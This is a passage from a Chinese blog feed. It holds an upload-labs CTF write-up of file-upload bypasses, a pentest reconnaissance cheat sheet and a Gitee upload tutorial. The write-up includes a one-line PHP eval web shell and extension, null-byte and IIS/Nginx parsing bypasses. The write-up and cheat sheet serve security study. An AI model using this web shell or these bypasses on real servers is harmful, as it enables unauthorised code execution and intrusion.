<span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            $msg = <span class="string">"上传失败！"</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(($fileext == <span class="string">"gif"</span>) &amp;&amp; ($filetype==<span class="string">"image/gif"</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file($tmpname,$target_path))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">//使用上传的图片生成新的图片</span></span><br><span class="line">            $im = imagecreatefromgif($target_path);</span><br><span class="line">            <span class="keyword">if</span>($im == <span class="keyword">false</span>)&#123;</span><br><span class="line">                $msg = <span class="string">"该文件不是gif格式的图片！"</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="comment">//给新图片指定文件名</span></span><br><span class="line">                srand(time());</span><br><span class="line">                $newfilename = strval(rand()).<span class="string">".gif"</span>;</span><br><span class="line">                $newimagepath = $UPLOAD_ADDR.$newfilename;</span><br><span class="line">                imagegif($im,$newimagepath);</span><br><span class="line">                <span class="comment">//显示二次渲染后的图片（使用用户上传图片生成的新图片）</span></span><br><span class="line">                $img_path = $UPLOAD_ADDR.$newfilename;</span><br><span class="line">                unlink($target_path);</span><br><span class="line">                $is_upload = <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            $msg = <span class="string">"上传失败！"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $msg = <span class="string">"只允许上传后缀为.jpg|.png|.gif的图片文件！"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<blockquote>
<ul>
<li><strong>对图片进行二次渲染，先上传一个图片，再对比原来的图片，查看渲染的主要位置，然后再不会被渲染的位置加上一句话木马</strong></li>
</ul>
</blockquote>
<p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210723094040459.png" alt="image-20210723094040459"></p>
<h1 id="pass-17和pass-18条件竞争"><a href="#pass-17和pass-18条件竞争" class="headerlink" title="pass-17和pass-18条件竞争"></a>pass-17和pass-18条件竞争</h1><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>]))&#123;</span><br><span class="line">    $ext_arr = <span class="keyword">array</span>(<span class="string">'jpg'</span>,<span class="string">'png'</span>,<span class="string">'gif'</span>);</span><br><span class="line">    $file_name = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>];</span><br><span class="line">    $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">    $file_ext = substr($file_name,strrpos($file_name,<span class="string">"."</span>)+<span class="number">1</span>);</span><br><span class="line">    $upload_file = $UPLOAD_ADDR . <span class="string">'/'</span> . $file_name;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(move_uploaded_file($temp_file, $upload_file))&#123;</span><br><span class="line">        <span class="keyword">if</span>(in_array($file_ext,$ext_arr))&#123;</span><br><span class="line">             $img_path = $UPLOAD_ADDR . <span class="string">'/'</span>. rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">"YmdHis"</span>).<span class="string">"."</span>.$file_ext;</span><br><span class="line">             rename($upload_file, $img_path);</span><br><span class="line">             $is_upload = <span class="keyword">true</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            $msg = <span class="string">"只允许上传.jpg|.png|.gif类型文件！"</span>;</span><br><span class="line">            unlink($upload_file);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $msg = <span class="string">'上传失败！'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<blockquote>
<ul>
<li>利用php写的函数来进行强制访问生成</li>
</ul>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> file_put_contents(<span class="string">'shell.php'</span>, <span class="string">'&lt;?php eval($_REQUEST[2]);?&gt;'</span>) <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<h1 id="pass-19"><a href="#pass-19" class="headerlink" title="pass-19"></a>pass-19</h1><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists($UPLOAD_ADDR)) &#123;</span><br><span class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">"php"</span>,<span class="string">"php5"</span>,<span class="string">"php4"</span>,<span class="string">"php3"</span>,<span class="string">"php2"</span>,<span class="string">"html"</span>,<span class="string">"htm"</span>,<span class="string">"phtml"</span>,<span class="string">"pht"</span>,<span class="string">"jsp"</span>,<span class="string">"jspa"</span>,<span class="string">"jspx"</span>,<span class="string">"jsw"</span>,<span class="string">"jsv"</span>,<span class="string">"jspf"</span>,<span class="string">"jtml"</span>,<span class="string">"asp"</span>,<span class="string">"aspx"</span>,<span class="string">"asa"</span>,<span class="string">"asax"</span>,<span class="string">"ascx"</span>,<span class="string">"ashx"</span>,<span class="string">"asmx"</span>,<span class="string">"cer"</span>,<span class="string">"swf"</span>,<span class="string">"htaccess"</span>);</span><br><span class="line"></span><br><span class="line">        $file_name = $_POST[<span class="string">'save_name'</span>];</span><br><span class="line">        $file_ext = pathinfo($file_name,PATHINFO_EXTENSION);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!in_array($file_ext,$deny_ext)) &#123;</span><br><span class="line">            $img_path = $UPLOAD_ADDR . <span class="string">'/'</span> .$file_name;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>], $img_path)) &#123; </span><br><span class="line">                $is_upload = <span class="keyword">true</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                $msg = <span class="string">'上传失败！'</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            $msg = <span class="string">'禁止保存为该类型文件！'</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = $UPLOAD_ADDR . <span class="string">'文件夹不存在,请手工创建！'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<blockquote>
<ul>
<li><p><strong>绕过方法：控制文件名字、或者控制文件夹的名字。</strong></p>
</li>
<li><ul>
<li><strong>apache解析漏洞，保存为phpinfo.php.xxx</strong></li>
<li><strong>windows文件存储特性，加 .和空格</strong></li>
<li><strong>00截断</strong></li>
<li><strong>/.，move_uploaded_file会忽略掉文件末尾的/.（和windows存储特性不同，这个是函数的特性）。</strong></li>
<li><strong>通过BP 抓包，然后修改数据包 ：upload-20.php%00.jpg  在文件后缀加上jep ， 然后用 %00 进行截断。</strong></li>
<li><strong>上传.php文件，保存为.jpg文件，上传成功；上传.jpg文件，保存为.php文件，上传失败。这样看来校验的应该是保存的文件名，那么又需要看是白名单校验还是黑名单校验，还是上传.php文件，随便输入一个保存的文件名，随便输入一个后缀名，或者是不写后缀名，保存成功。说明是黑名单验证。那黑名单验证就有太多的绕过方式了。</strong></li>
</ul>
</li>
</ul>
</blockquote>
<p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210723104553232.png" alt="image-20210723104553232"></p>
<p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210723104606229.png" alt="image-20210723104606229"></p>
<h1 id="pass-20"><a href="#pass-20" class="headerlink" title="pass-20"></a>pass-20</h1><p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210723104950466.png" alt="image-20210723104950466"></p>
<blockquote>
<ul>
<li><p><strong>IIS6.0解析漏洞（一）：</strong><br><strong>IIS6.0解析漏洞分两种</strong><br><strong>1、目录解析</strong><br><strong>以*.asp命名的文件夹里的文件都将会被当成ASP文件执行。</strong></p>
<p><strong>2、文件解析</strong><br><strong>*.asp;.jpg 像这种畸形文件名在“；”后面的直接被忽略，也就是说当成 *.asp文件执行。</strong><br><strong>IIS6.0 默认的可执行文件除了asp还包含这三种 *.asa *.cer *.cdx</strong></p>
</li>
</ul>
</blockquote>
<p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210723105417872.png" alt="image-20210723105417872"></p>
<p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210723105451696.png" alt="image-20210723105451696"></p>
<blockquote>
<ul>
<li><strong>可以直接菜刀连asp</strong></li>
</ul>
</blockquote>
<h1 id="pass-21"><a href="#pass-21" class="headerlink" title="pass-21"></a>pass-21</h1><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line">$allowedExts = <span class="keyword">array</span>(<span class="string">"gif"</span>, <span class="string">"jpeg"</span>, <span class="string">"jpg"</span>, <span class="string">"png"</span>);</span><br><span class="line">$temp = explode(<span class="string">"."</span>, $_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>]);</span><br><span class="line"><span class="keyword">echo</span> $_FILES[<span class="string">"file"</span>][<span class="string">"size"</span>];</span><br><span class="line">$extension = end($temp);     <span class="comment">// 获取文件后缀名</span></span><br><span class="line"><span class="keyword">if</span> ((($_FILES[<span class="string">"file"</span>][<span class="string">"type"</span>] == <span class="string">"image/gif"</span>)</span><br><span class="line">|| ($_FILES[<span class="string">"file"</span>][<span class="string">"type"</span>] == <span class="string">"image/jpeg"</span>)</span><br><span class="line">|| ($_FILES[<span class="string">"file"</span>][<span class="string">"type"</span>] == <span class="string">"image/jpg"</span>)</span><br><span class="line">|| ($_FILES[<span class="string">"file"</span>][<span class="string">"type"</span>] == <span class="string">"image/pjpeg"</span>)</span><br><span class="line">|| ($_FILES[<span class="string">"file"</span>][<span class="string">"type"</span>] == <span class="string">"image/x-png"</span>)</span><br><span class="line">|| ($_FILES[<span class="string">"file"</span>][<span class="string">"type"</span>] == <span class="string">"image/png"</span>))</span><br><span class="line">&amp;&amp; ($_FILES[<span class="string">"file"</span>][<span class="string">"size"</span>] &lt; <span class="number">204800</span>)   <span class="comment">// 小于 200 kb</span></span><br><span class="line">&amp;&amp; in_array($extension, $allowedExts))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> ($_FILES[<span class="string">"file"</span>][<span class="string">"error"</span>] &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"错误：: "</span> . $_FILES[<span class="string">"file"</span>][<span class="string">"error"</span>] . <span class="string">""</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"上传文件名: "</span> . $_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>] . <span class="string">""</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"文件类型: "</span> . $_FILES[<span class="string">"file"</span>][<span class="string">"type"</span>] . <span class="string">""</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"文件大小: "</span> . ($_FILES[<span class="string">"file"</span>][<span class="string">"size"</span>] / <span class="number">1024</span>) . <span class="string">" kB"</span>;</span><br><span class="line">      </span><br><span class="line">        <span class="keyword">if</span> (file_exists(<span class="string">"./b/image/"</span> . $_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>]))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">echo</span> $_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>] . <span class="string">" 文件已经存在。 "</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// 如果 upload 目录不存在该文件则将文件上传到 upload 目录下</span></span><br><span class="line">            $ret = move_uploaded_file($_FILES[<span class="string">"file"</span>][<span class="string">"tmp_name"</span>], <span class="string">"image/"</span> . $_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>]);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"文件存储在: "</span> . <span class="string">"./b/image/"</span> . $_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>];</span><br><span class="line">	    <span class="keyword">echo</span> <span class="string">""</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"非法的文件格式"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<blockquote>
<ul>
<li>白名单机制不影响;来截断进行getshell</li>
</ul>
</blockquote>
<h1 id="pass-22"><a href="#pass-22" class="headerlink" title="pass-22"></a>pass-22</h1><blockquote>
<ul>
<li>直接上传一个图片，解析</li>
</ul>
</blockquote>
<p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210723110211328.png" alt="image-20210723110211328"></p>
<h1 id="pass-23"><a href="#pass-23" class="headerlink" title="pass-23"></a>pass-23</h1><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">$allowedExts = <span class="keyword">array</span>(<span class="string">"jpg"</span>);</span><br><span class="line">$time = time();</span><br><span class="line">$temp = explode(<span class="string">"."</span>, $_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>]);</span><br><span class="line"><span class="keyword">echo</span> $_FILES[<span class="string">"file"</span>][<span class="string">"size"</span>];</span><br><span class="line">$extension = end($temp);     <span class="comment">// 获取文件后缀名</span></span><br><span class="line"><span class="keyword">if</span> ((($_FILES[<span class="string">"file"</span>][<span class="string">"type"</span>] == <span class="string">"image/gif"</span>)</span><br><span class="line">|| ($_FILES[<span class="string">"file"</span>][<span class="string">"type"</span>] == <span class="string">"image/jpeg"</span>)</span><br><span class="line">|| ($_FILES[<span class="string">"file"</span>][<span class="string">"type"</span>] == <span class="string">"image/jpg"</span>)</span><br><span class="line">|| ($_FILES[<span class="string">"file"</span>][<span class="string">"type"</span>] == <span class="string">"image/pjpeg"</span>)</span><br><span class="line">|| ($_FILES[<span class="string">"file"</span>][<span class="string">"type"</span>] == <span class="string">"image/x-png"</span>)</span><br><span class="line">|| ($_FILES[<span class="string">"file"</span>][<span class="string">"type"</span>] == <span class="string">"image/png"</span>))</span><br><span class="line">&amp;&amp; ($_FILES[<span class="string">"file"</span>][<span class="string">"size"</span>] &lt; <span class="number">204800</span>)   <span class="comment">// 小于 200 kb</span></span><br><span class="line">&amp;&amp; in_array($extension, $allowedExts))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> ($_FILES[<span class="string">"file"</span>][<span class="string">"error"</span>] &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"错误：: "</span> . $_FILES[<span class="string">"file"</span>][<span class="string">"error"</span>] . <span class="string">""</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"上传文件名: "</span> . $_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>] . <span class="string">""</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"文件类型: "</span> . $_FILES[<span class="string">"file"</span>][<span class="string">"type"</span>] . <span class="string">""</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"文件大小: "</span> . ($_FILES[<span class="string">"file"</span>][<span class="string">"size"</span>] / <span class="number">1024</span>) . <span class="string">" kB"</span>;</span><br><span class="line">      </span><br><span class="line">        <span class="keyword">if</span> (file_exists(<span class="string">"C:/Inetpub/wwwroot/c/image/a.asp/"</span> .$time.<span class="string">".jpg"</span>))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">echo</span> $_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>] . <span class="string">" 文件已经存在。 "</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// 如果 upload 目录不存在该文件则将文件上传到 upload 目录下</span></span><br><span class="line">            $ret = move_uploaded_file($_FILES[<span class="string">"file"</span>][<span class="string">"tmp_name"</span>], <span class="string">"image/a.asp/"</span>.$time.<span class="string">".jpg"</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"文件存储在: "</span> . <span class="string">"./c/image/a.asp/"</span>.$time.<span class="string">".jpg"</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">""</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"非法的文件格式"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<blockquote>
<ul>
<li><strong>这题主要是教我们一个姿势，帮我们定好了文件名，上传一个包含asp一句话木马的图片</strong></li>
</ul>
</blockquote>
<p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210723111848603.png" alt="image-20210723111848603"></p>
<blockquote>
<ul>
<li><strong>由此可以看出文件名中若是带有后缀asp的也可以在iis6.0中解析</strong></li>
</ul>
</blockquote>
<p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210723111907829.png" alt="image-20210723111907829"></p>
<h1 id="pass-24"><a href="#pass-24" class="headerlink" title="pass-24"></a>pass-24</h1><blockquote>
<ul>
<li><strong>本题考查的是cgi解析漏洞：</strong><br><strong>Nginx在图片中嵌入PHP代码然后通过访问</strong><br>*<em>xxx.jpg/1.php *</em>来执行其中的代码，上传一个图片马php</li>
</ul>
</blockquote>
<p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210723112427410.png" alt="image-20210723112427410"></p>
<p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210723112448518.png" alt="image-20210723112448518"></p>
<p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210723112502513.png" alt="image-20210723112502513"></p>
<h1 id="我的个人博客"><a href="#我的个人博客" class="headerlink" title="我的个人博客"></a>我的个人博客</h1><blockquote>
<h2 id="孤桜懶契：http-gylq-github-io"><a href="#孤桜懶契：http-gylq-github-io" class="headerlink" title="孤桜懶契：http://gylq.github.io"></a>孤桜懶契：<a href="http://gylq.github.io" target="_blank" rel="noopener">http://gylq.github.io</a></h2></blockquote>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
        <tag>黑客工具</tag>
        <tag>文件上传</tag>
      </tags>
  </entry>
  <entry>
    <title>【渗透测试】信息收集-备忘单</title>
    <url>/2021/07/19/%E3%80%90%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E3%80%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-%E5%A4%87%E5%BF%98%E5%8D%95/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><blockquote>
<ul>
<li><h2 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h2><ul>
<li><strong>御剑目录扫描</strong></li>
<li><strong>kali dirbuster</strong></li>
</ul>
</li>
<li><h2 id="子域名收集"><a href="#子域名收集" class="headerlink" title="子域名收集"></a>子域名收集</h2><ul>
<li><p><a href="https://github.com/euphrat1ca/LayerDomainFinder" target="_blank" rel="noopener">Layer子域名挖掘机</a></p>
</li>
<li><p><a href="https://github.com/lijiejie/subDomainsBrute" target="_blank" rel="noopener">subDomainsBrute</a></p>
</li>
</ul>
</li>
</ul>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="code"><pre><span class="line">python2 subDomainsBrute.py qq.com -f subnames_full.txt -o qq.com.csv</span><br></pre></td></tr></table></figure></div>
<ul>
<li><strong>常用的子域名工具如下（Github都可搜到）</strong></li>
</ul>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">OneForAll</span><br><span class="line">Layer</span><br><span class="line">Sublist3r</span><br><span class="line">subDomainsBrute</span><br><span class="line">K8</span><br><span class="line">wydomain</span><br><span class="line">dnsmaper</span><br><span class="line">dnsbrute</span><br><span class="line">Findomain</span><br><span class="line">fierce等</span><br></pre></td></tr></table></figure></div>

<ul>
<li><h2 id="whois信息-ip反查-邮件反查-资产相关"><a href="#whois信息-ip反查-邮件反查-资产相关" class="headerlink" title="whois信息/ip反查/邮件反查/资产相关"></a>whois信息/ip反查/邮件反查/资产相关</h2><ul>
<li><strong>kali whois</strong></li>
<li><a href="http://tool.chinaz.com/" target="_blank" rel="noopener">站长工具</a></li>
<li><a href="https://www.webscan.cc/" target="_blank" rel="noopener">C记录查询</a></li>
<li><a href="https://ping.chinaz.com/" target="_blank" rel="noopener">查是否用了CDN</a></li>
<li><a href="https://www.tianyancha.com/" target="_blank" rel="noopener">天眼查</a></li>
</ul>
</li>
<li><h2 id="端口服务"><a href="#端口服务" class="headerlink" title="端口服务"></a>端口服务</h2><ul>
<li>使用nmap查询这个端口对应的服务</li>
</ul>
</li>
</ul>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">nmap -p0-65535 192.168.43.69 -A &#x2F;&#x2F;扫描0-65535端口并返回info</span><br><span class="line">nmap -v -A -F -iL target.txt -oX target_f.xml &#x2F;&#x2F;批量扫描</span><br></pre></td></tr></table></figure></div>

<ul>
<li><h2 id="web-信息探测"><a href="#web-信息探测" class="headerlink" title="web 信息探测"></a>web 信息探测</h2><ul>
<li><p><a href="https://www.yunsee.cn/" target="_blank" rel="noopener">云悉指纹识别</a></p>
</li>
<li><p><a href="http://finger.tidesec.net/" target="_blank" rel="noopener">TideFinger</a></p>
</li>
<li><p><a href="http://whatweb.bugscaner.com/look/" target="_blank" rel="noopener">BugScaner</a></p>
</li>
<li><p><a href="https://fp.shuziguanxing.com/#/" target="_blank" rel="noopener">数字观星</a></p>
</li>
<li><p><a href="https://www.whatweb.net/" target="_blank" rel="noopener">whatweb</a></p>
</li>
<li><p><strong>Github项目</strong></p>
</li>
</ul>
</li>
</ul>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">CMSeeK</span><br><span class="line">CMSmap</span><br><span class="line">ACMSDiscovery</span><br><span class="line">TideFinger</span><br><span class="line">AngelSword</span><br></pre></td></tr></table></figure></div>

<ul>
<li><h2 id="邮件收集-theHarvester"><a href="#邮件收集-theHarvester" class="headerlink" title="邮件收集 theHarvester"></a>邮件收集 <a href="https://github.com/laramies/theHarvester" target="_blank" rel="noopener">theHarvester</a></h2></li>
<li><h2 id="穷举爆破神器-hydra"><a href="#穷举爆破神器-hydra" class="headerlink" title="穷举爆破神器 hydra"></a>穷举爆破神器 hydra</h2></li>
</ul>
</blockquote>
]]></content>
      <categories>
        <category>黑客工具</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
        <tag>备忘录</tag>
        <tag>黑客工具</tag>
      </tags>
  </entry>
  <entry>
    <title>【GITHUB】Github上传本地项目</title>
    <url>/2021/07/19/%E3%80%90GITHUB%E3%80%91Github%E4%B8%8A%E4%BC%A0%E6%9C%AC%E5%9C%B0%E9%A1%B9%E7%9B%AE/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="Github简介"><a href="#Github简介" class="headerlink" title="Github简介"></a>Github简介</h1><blockquote>
<p><strong>GitHub是基于git实现的代码托管。git是目前最好用的版本控制系统了，非常受欢迎，比之svn更好。</strong></p>
<p><strong>GitHub可以免费使用，并且快速稳定。即使是付费帐户，每个月不超过10美刀的费用也非常便宜。</strong></p>
<p><strong>利用GitHub，你可以将项目存档，与其他人分享交流，并让其他开发者帮助你一起完成这个项目。优点在于，他支持多人共同完成一个项目，因此你们可以在同一页面对话交流。</strong></p>
<p><strong>创建自己的项目，并备份，代码不需要保存在本地或者服务器，GitHub做得非常理想。</strong></p>
</blockquote>
<h1 id="Gitee和Github区别"><a href="#Gitee和Github区别" class="headerlink" title="Gitee和Github区别"></a>Gitee和Github区别</h1><blockquote>
<ul>
<li><strong>Gitee是中国大陆的所以访问不会出现问题，本次环境使用gitee，两者没有任何区别，也就是访问速度问题。</strong></li>
</ul>
</blockquote>
<h1 id="Gitee新建仓库"><a href="#Gitee新建仓库" class="headerlink" title="Gitee新建仓库"></a>Gitee新建仓库</h1><blockquote>
<p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210719155252502.png" alt="image-20210719155252502"></p>
<p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210719155553524.png" alt="image-20210719155553524"></p>
</blockquote>
<h1 id="Gitee账户设置SSH-key"><a href="#Gitee账户设置SSH-key" class="headerlink" title="Gitee账户设置SSH key"></a>Gitee账户设置SSH key</h1><blockquote>
<p><strong>众所周知ssh key是加密传输。</strong></p>
<p><strong>加密传输的算法有好多，git使用rsa，rsa要解决的一个核心问题是，如何使用一对特定的数字，使其中一个数字可以用来加密，而另外一个数字可以用来解密。这两个数字就是你在使用git和github的时候所遇到的public key也就是公钥以及private key私钥。</strong></p>
<p><strong>其中，公钥就是那个用来加密的数字，这也就是为什么你在本机生成了公钥之后，要上传到github的原因。从github发回来的，用那公钥加密过的数据，可以用你本地的私钥来还原。</strong></p>
<p><strong>如果你的key丢失了，不管是公钥还是私钥，丢失一个都不能用了，解决方法也很简单，重新再生成一次，然后在github.com里再设置一次就行</strong></p>
</blockquote>
<h2 id="生成ssh-key"><a href="#生成ssh-key" class="headerlink" title="生成ssh key"></a>生成ssh key</h2><blockquote>
<ul>
<li><strong>首先检测是否已生成密钥，ls如果有3个文件，则密钥已经生成</strong></li>
</ul>
<p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210719155833254.png" alt="image-20210719155833254"></p>
<ul>
<li><strong>如果没有生成，那么通过命令生成，直接回车键，这里不使用密码进行登录，用密码太麻烦</strong></li>
</ul>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">$ ssh-keygen -t rsa -C “2324298849@qq.com&quot;</span><br></pre></td></tr></table></figure></div>

<ul>
<li>去目录里面打开刚刚<strong>生成</strong>的<strong>id_rsa.pub</strong></li>
</ul>
<p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210719160347205.png" alt="image-20210719160347205"></p>
<p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210719160425963.png" alt="image-20210719160425963"></p>
<p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210719160516332.png" alt="image-20210719160516332"></p>
<p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210719160524961.png" alt="image-20210719160524961"></p>
</blockquote>
<h1 id="Gitee上传本地项目"><a href="#Gitee上传本地项目" class="headerlink" title="Gitee上传本地项目"></a>Gitee上传本地项目</h1><blockquote>
<ul>
<li><strong>接着到你的项目地址上面，按着教程顺着打一遍</strong></li>
</ul>
<p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210719160711811.png" alt="image-20210719160711811"></p>
<p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210719160740555.png" alt="image-20210719160740555"></p>
<p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210719160856828.png" alt="image-20210719160856828"></p>
</blockquote>
<h1 id="我的个人博客"><a href="#我的个人博客" class="headerlink" title="我的个人博客"></a>我的个人博客</h1><blockquote>
